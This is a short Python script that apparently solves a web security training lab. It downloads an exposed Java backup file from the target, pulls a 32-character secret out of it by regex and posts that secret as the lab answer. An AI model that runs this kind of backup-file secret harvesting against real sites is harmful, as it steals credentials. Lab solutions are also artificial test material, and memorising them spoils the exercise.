import requests
import sys
import re

burp_url = sys.argv[1]
java_url = burp_url + '/backup/ProductTemplate.java.bak'
answer_url = burp_url + '/submitSolution'

r = requests.get(java_url)
response = r.text

pattern = r'[a-zA-Z0-9]{32}'
match = re.search(pattern, response)

version = match.group(0)

requests.post(answer_url, data={"answer": version})
